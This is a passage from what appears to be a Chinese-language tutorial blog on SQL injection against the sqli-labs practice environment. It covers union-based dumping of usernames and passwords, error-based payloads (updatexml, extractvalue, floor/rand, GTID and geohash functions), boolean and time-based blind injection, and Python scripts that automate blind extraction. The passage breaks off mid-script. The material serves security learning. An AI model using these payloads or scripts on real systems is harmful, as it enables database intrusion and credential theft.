class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:security</span><br><span class="line"></span><br><span class="line">4.查找列名</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:id,username,password</span><br><span class="line">Your Password:security</span><br><span class="line"></span><br><span class="line">4.查找password</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(username,0x3a,password) from users),(select database()) --+</span><br><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4</span><br><span class="line">Your Password:security</span><br></pre></td></tr></table></figure>
<p>当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合。</p>
<p>字符型：select * from table where username=‘test’</p>
<p>字符型注入最关键的是如何闭合 SQL 语句以及注释多余的代码</p>
<p>查询内容为字符串时：select * from table where username = ‘test’</p>
<p>测试：</p>
<p>select * from table where username = ‘test and 1=1’ ，无法注入，“test and 1=1” 会被数据库当作查询的字符串</p>
<p>select * from table where username = ‘test’ and ‘1’='1’ --’，必须闭合字符串才可以继续注入</p>
<h5 id="报错注入"><a class="markdownIt-Anchor" href="#报错注入">#</a> 报错注入</h5>
<p>查询错误会输出相应的错误，查询正确没有对应输出</p>
<h6 id="1st_latfromgeohashmysql57x"><a class="markdownIt-Anchor" href="#1st_latfromgeohashmysql57x">#</a> 1.ST_LatFromGeoHash()（mysql&gt;=5.7.x）</h6>
<p>计算纬度 hash 报错</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))--+</span><br><span class="line">and ST_LatFromGeoHash(user())--+  //可以对于系统命令直接查询</span><br></pre></td></tr></table></figure>
<h6 id="2st_longfromgeohashmysql57x"><a class="markdownIt-Anchor" href="#2st_longfromgeohashmysql57x">#</a> 2.ST_LongFromGeoHash（mysql&gt;=5.7.x）</h6>
<p>payload</p>
<p>#同 8 ，都使用了嵌套查询</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ST_LongFromGeoHash(concat(0x7e,(select user()),0x7e))--+</span><br></pre></td></tr></table></figure>
<h6 id="3gtid-mysql-56x-显错200"><a class="markdownIt-Anchor" href="#3gtid-mysql-56x-显错200">#</a> 3.GTID (MySQL&gt;= 5.6.X - 显错 &lt;=200)</h6>
<p>0x01 GTID</p>
<p>GTID 是 MySQL 数据库每次提交事务后生成的一个全局事务标识符，GTID 不仅在本服务器上是唯一的，其在复制拓扑中也是唯一的</p>
<h6 id="gtid_subset-和-gtid_subtract函数"><a class="markdownIt-Anchor" href="#gtid_subset-和-gtid_subtract函数">#</a> GTID_SUBSET () 和 GTID_SUBTRACT () 函数</h6>
<p>0X02 函数详解</p>
<p>GTID_SUBSET () 和 GTID_SUBTRACT () 函数，我们知道他的输入值是 GTIDset ，当输入有误时，就会报错</p>
<p>GTID_SUBSET (set1 , set2) - 若在 set1 中的 GTID，也在 set2 中，返回 true，否则返回 false ( set1 是 set2 的子集)<br>
 GTID_SUBTRACT (set1 , set2) - 返回在 set1 中，不在 set2 中的 GTID 集合 ( set1 与 set2 的差集)</p>
<p>0x03 注入过程 (payload)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GTID_SUBSET函数</span><br><span class="line"></span><br><span class="line">&#x27;) or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br><span class="line"> </span><br><span class="line">GTID_SUBTRACT</span><br><span class="line"></span><br><span class="line">&#x27;) or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br></pre></td></tr></table></figure>
<p>函数都是那样，只是适用的版本不同</p>
<h6 id="4floor8xmysql50"><a class="markdownIt-Anchor" href="#4floor8xmysql50">#</a> 4.floor（8.x&gt;mysql&gt;5.0）</h6>
<p>利用 select count (*),(floor (rand (0)*2)) x from table group by x，导致数据库报错，通过 concat 函数，连接注入语句与 floor (rand (0)*2) 函数，实现将注入结果与报错信息回显的注入方式。</p>
<p>基本的查询 select 不必多说，剩下的几个关键字有 count 、group by 、floor、rand。</p>
<p>1.rand () 函数，获取一个 0-1 之间的随机数</p>
<p>但如果给一个固定的随机种子之后 rand (0), 每次产生的值都是一样的。也可以称之为伪随机（产生的数据都是可预知的）。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235308883-1871895582.png" alt="img"></p>
<p>2.floor（rand（0）*2）函数</p>
<p>floor () 函数的作用就是返回小于等于括号内该值的最大整数。</p>
<p>而 rand () 是返回 0 到 1 之间的随机数，那么 floor（rand（0））产生的数就只是 0，这样就不能实现报错的：</p>
<p>而 rand 产生的数乘 2 后自然是返回 0 到 2 之间的随机数，再配合 floor () 就可以产生确定的两个数了。也就是 0 和 1：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235309428-1152684208.png" alt="img"></p>
<p>并且根据固定的随机数种子 0，他每次产生的随机数列都是相同的 0 1 1 0 1 1。</p>
<p>3.group by 函数</p>
<p>group by 主要用来对数据进行分组（相同的分为一组，显示相同组最前的 ID）。</p>
<p>4.count（*）函数</p>
<p>count（*）统计结果的记录数。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235310739-413634853.png" alt="img"></p>
<p>5. 综合使用产生报错：</p>
<p>select count(*),floor(rand(0)*2) x from users group by x;</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235310997-244751856.png"><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235310997-244751856.png" alt="img"></a></p>
<p>根据前面函数，这句话就是统计后面产生随机数的种类并计算每种数量。</p>
<p>分别产生 0 1 1 0 1 1 ，这样 0 是 2 个，1 是 4 个，但是最后却产生了报错。</p>
<p><strong>三、报错分析</strong></p>
<p>这个整合然后计数的过程中，中间发生了什么我们是必须要明白的。<br>
首先 mysql 遇到该语句时会建立一个虚拟表。该虚拟表有两个字段，一个是分组的 key ，一个是计数值 count (<em>)。也就对应于实验中的 user_name 和 count (</em>)。<br>
然后<strong>在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加 1，不存在则新 建该分组。</strong></p>
<p>然后 mysql 官方有给过提示，就是查询的时候如果使用 rand () 的话，该值会被计算多次，那这个 &quot;被计算多次&quot; 到底是什么意思，就是在使用 group by 的时候，floor (rand (0)*2) 会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，我们来看下 floor (rand (0)*2) 报错的过程就知道了，从上面的函数使用中可以看到在一次多记录的查询过程中 floor (rand (0)*2) 的值是定性的，为 011011 (这个顺序很重要)，报错实际上就是 floor (rand (0)*2) 被计算多次导致的，我们还原一下具体的查询过程：</p>
<p>（1）查询前默认会建立空虚拟表如下图:</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311248-2120506620.png"><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311248-2120506620.png" alt="img"></a></p>
<p>（2）取第一条记录，执行 floor (rand (0)*2)，发现结果为 0 (第一次计算),</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311467-1420082064.png"><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311467-1420082064.png" alt="img"></a></p>
<p>（3）查询虚拟表，发现 0 的键值不存在，则插入新的键值的时候 floor (rand (0)*2) 会被再计算一次，结果为 1 (第二次计算)，插入虚表，这时第一条记录查询完毕，如下图:</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311702-8360327.png"><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311702-8360327.png" alt="img"></a></p>
<p>（4）查询第二条记录，再次计算 floor (rand (0)*2)，发现结果为 1 (第三次计算)</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311920-791381551.png"><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311920-791381551.png" alt="img"></a></p>
<p>（5）查询虚表，发现 1 的键值存在，所以 floor (rand (0)<em> 2) 不会被计算第二次，直接 count (</em>) 加 1，第二条记录查询完毕，结果如下:</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235312142-2071009941.png"><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312142-2071009941.png" alt="img"></a></p>
<p>（6）查询第三条记录，再次计算 floor (rand (0)*2)，发现结果为 0 (第 4 次计算)</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235312396-1593125203.png"><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312396-1593125203.png" alt="img"></a></p>
<p>（7）查询虚表，发现键值没有 0，则数据库尝试插入一条新的数据，在插入数据时 floor (rand (0)*2) 被再次计算，作为虚表的主键，其值为 1 (第 5 次计算)，</p>
<p><a href=""><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312660-1954097450.png" alt="img"></a></p>
<p><strong>然而 1 这个主键已经存在于虚拟表中，而新计算的值也为 1 (主键键值必须唯一)，所以插入的时候就直接报错了。</strong></p>
<p><strong>四、总结</strong></p>
<p><strong>整个查询过程 floor (rand (0)*2) 被计算了 5 次，查询原数据表 3 次，所以这就是为什么数据表中需要最少 3 条数据，使用该语句才会报错的原因。</strong></p>
<p>payload:</p>
<p>#获取数据库版本信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;)or (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
<p>#获取当前数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;)or (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
<p>#获取表数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;)or (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;test&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
<p>#获取 users 表里的段名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;)or (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
<p>#payload2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select count(*) from information_schema.tables group by concat(floor(rand(0)*2),database())</span><br></pre></td></tr></table></figure>
<h6 id="5st_pointfromgeohash-mysql57"><a class="markdownIt-Anchor" href="#5st_pointfromgeohash-mysql57">#</a> 5.ST_Pointfromgeohash (mysql&gt;=5.7)</h6>
<p>获取数据库版本信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;)or ST_PointFromGeoHash(version(),1)--+</span><br></pre></td></tr></table></figure>
<p>获取表数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;)or ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+</span><br></pre></td></tr></table></figure>
<p>获取 users 表里的段名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;)or ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = &#x27;manage&#x27; limit 0,1),1)--+</span><br></pre></td></tr></table></figure>
<p>获取字段里面的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;)or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,&#x27;:&#x27;,`password`) from manage),0x23)),1)--+</span><br></pre></td></tr></table></figure>
<h6 id="6-updatexml"><a class="markdownIt-Anchor" href="#6-updatexml">#</a> 6 updatexml</h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,1,1) 一共可以接收三个参数，报错位置在第二个参数</span><br><span class="line">updatexml(目标文档,xpath路径,更新内容)</span><br><span class="line">updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class="line">xpath syntax error:&#x27;~root@localhost~&#x27;</span><br><span class="line"></span><br><span class="line">有一点需要注意，updatexml()能查询字符串的最大长度为32，</span><br><span class="line">updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">concat是针对以行数据做的拼接，而group_concat是针对列做的数据拼接，且group_concat自动生成逗号。</span><br><span class="line">concat该函数主要针对一行数据中多个字段的拼接</span><br><span class="line">group_concat该函数主要争对多行数据中[单个/多个]字段的拼接</span><br></pre></td></tr></table></figure>
<h6 id="7-extractvalue"><a class="markdownIt-Anchor" href="#7-extractvalue">#</a> 7 extractvalue</h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,1) 一共可以接收两个参数，报错位置在第二个参数</span><br><span class="line">extravalue(xml标记片段,xpath表达式) 对xml文档在xpath路径进行查询的函数</span><br><span class="line">报错时返回非法内容,即利用xpath路径错误报错</span><br><span class="line"></span><br><span class="line">extractvalue(1,concat(0x7e,(select user()),0x7e))--+</span><br><span class="line">XPATH syntax error: &#x27;~root@localhost~&#x27;</span><br><span class="line"></span><br><span class="line">有一点需要注意，extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32,就需要用substring()函数截取，一次查看32位,或者使用limit单次查询</span><br><span class="line">and extractvalue(1,concat(0x7e,substring((select group_concat(username,&quot;:&quot;,password)from users),1,32),0x7e))--+</span><br></pre></td></tr></table></figure>
<p>报错注入总结：<br>
<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213222739771.png" alt="image-20220213222739771"></p>
<h5 id="盲注"><a class="markdownIt-Anchor" href="#盲注">#</a> 盲注</h5>
<p>在 SQL 注入过程中，SQL 语句执行后，选择的数据不能回显到前端页面，此时需要利用一些</p>
<p>方法进行判断或者尝试，这个过程称之为盲注。</p>
<p>在盲注中，攻击者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响 应时间不同）。一般情况下，盲注可分为两类：</p>
<p>基于布尔的盲注（Boolean based）</p>
<p>基于时间的盲注（Time based）</p>
<p>1. 基于布尔的盲注</p>
<p>某些场合下，页面返回的结果只有两种（正常或错误）。通过构造 SQL 判断语句，查看页 面的返回结果（True or False）来判断哪些 SQL 判断条件成立，通过此来获取数据库中的 数据。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">前一个为0，后一个为真是or=1</span><br><span class="line">id=-1&#x27; or (select substr(version(),1,1)=&#x27;5&#x27;) # </span><br><span class="line">或使用left截取字符</span><br><span class="line">?id=1&#x27; and left(version(),1)=5--+  &#x27;</span><br><span class="line">如果此时不报错或有回显，说明version的第一个字符为5</span><br><span class="line">id=-1&#x27; or (select 1 from information_schema.tables where table_schema=database() and substr(table_name,1,1)=&#x27;u&#x27; limit 0,1) #   </span><br><span class="line">此时不报错或有回显说明第一字符为u</span><br><span class="line">或者根据ASCII值来判断</span><br><span class="line">id=-1&#x27; or (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)&gt;100 #   </span><br><span class="line">每次取子串，逐个获取对应的ASCII值，获取完整内容</span><br><span class="line">mid(&#x27;abcd&#x27;,1,1)  //a</span><br><span class="line">substring(&#x27;abcd&#x27;,1,1)  //a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者使用Burp Suite  Intruder</span><br><span class="line">Position  Sniper 只能设置一个变量</span><br><span class="line">设置paylaod</span><br><span class="line">attack后会根据设置的值发包，根据可能的Length排序找到正确的值</span><br><span class="line"></span><br><span class="line">Battering ram 可以接收两个参数</span><br><span class="line">pitchfork 配置两个参数</span><br><span class="line">cluster 组合所有可能性发包</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>根据是否有正确的回显判断</p>
<p>2. 基于时间的盲注</p>
<p>又称延时注入，即使用具有延时功能的函数 sleep、benchmark 等，通过判断这些函数是 否正常执行来获取数据库中的数据。</p>
<p>和布尔盲注的区别在于，无论查询是否成功，前端的页面都一样，而布尔的前提是页面针对是否查询出来有相应的回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; or sleep(3) % 23</span><br><span class="line">?id=1&#x27; or if((select table_name from information_schema.tables where table_schema=database() limit 0,1)&gt;0,sleep(2),0) #</span><br><span class="line">根据对应的ASCII判断，如果正确停两秒</span><br><span class="line">?id= 1 if((select ascii(substr(table_name,1,1))from information_scheam.tables where table_schema=database() limit 0,1)&gt;96,sleep(2),0) %23</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(3),0) --+</span><br><span class="line">通过逐个字符与ASCII比对，逐个遍历出所有需要的数据</span><br><span class="line">比如database()，数据库长度length(database())</span><br></pre></td></tr></table></figure>
<p>3. 通过 python 脚本或 sqlmap 进行盲注</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#基于bool盲注</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&quot;http://127.0.0.1/sqllabs/Less-5/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject_database</span>(<span class="params">url1</span>):</span><br><span class="line">	name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100000</span>):</span><br><span class="line">		low = <span class="number">32</span></span><br><span class="line">		high = <span class="number">128</span></span><br><span class="line">		mid = (low + high) // <span class="number">2</span></span><br><span class="line">		<span class="keyword">while</span> low &lt; high:</span><br><span class="line">			payload = <span class="string">&quot;1&#x27; and ascii(substr((select database()),%d,1)) &gt; %d-- &quot;</span> % (i, mid)</span><br><span class="line">			params = &#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">			r = requests.get(url1, params=params)</span><br><span class="line">			<span class="comment"># payload = url.format(_ = i, __ = mid)</span></span><br><span class="line">			<span class="comment"># r = requests.get(payload)</span></span><br><span class="line">			<span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				low = mid + <span class="number">1</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				high = mid</span><br><span class="line">			mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> mid == <span class="number">32</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		name = name + <span class="built_in">chr</span>(mid)</span><br><span class="line">		<span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject_table</span>(<span class="params">url</span>):</span><br><span class="line">	name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100000</span>):</span><br><span class="line">		low = <span class="number">32</span></span><br><span class="line">		high = <span class="number">128</span></span><br><span class="line">		mid = (low + high) // <span class="number">2</span></span><br><span class="line">		<span class="keyword">while</span> low &lt; high:</span><br><span class="line">			payload = <span class="string">&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;sqli&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)</span><br><span class="line">			params = &#123;<span class="string">&#x27;id&#x27;</span>:payload&#125;</span><br><span class="line">			r = requests.get(url,params = params)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				low = mid + <span class="number">1</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				high = mid</span><br><span class="line">			mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> mid == <span class="number">32</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		name = name + <span class="built_in">chr</span>(mid)</span><br><span class="line">		<span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject_column</span>(<span class="params">url</span>):</span><br><span class="line">	name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100000</span>):</span><br><span class="line">		low = <span class="number">32</span></span><br><span class="line">		high = <span class="number">128</span></span><br><span class="line">		mid = (low + high) // <span class="number">2</span></span><br><span class="line">		<span class="keyword">while</span> low &lt; high:</span><br><span class="line">			payload = <span class="string">&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)</span><br><span class="line">			params = &#123;<span class="string">&#x27;id&#x27;</span>:payload&#125;</span><br><span class="line">			r = requests.get(url,params = params)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				low = mid + <span class="number">1</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				high = mid</span><br><span class="line">			mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> mid == <span class="number">32</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		name = name + <span class="built_in">chr</span>(mid)</span><br><span class="line">		<span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inject_database(url)</span><br><span class="line"><span class="comment"># inject_table(url)</span></span><br><span class="line"><span class="comment"># inject_column(url)</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#基于时间盲注</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqllabs/Less-15/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject_database</span>(<span class="params">url</span>):</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100000</span>):</span><br><span 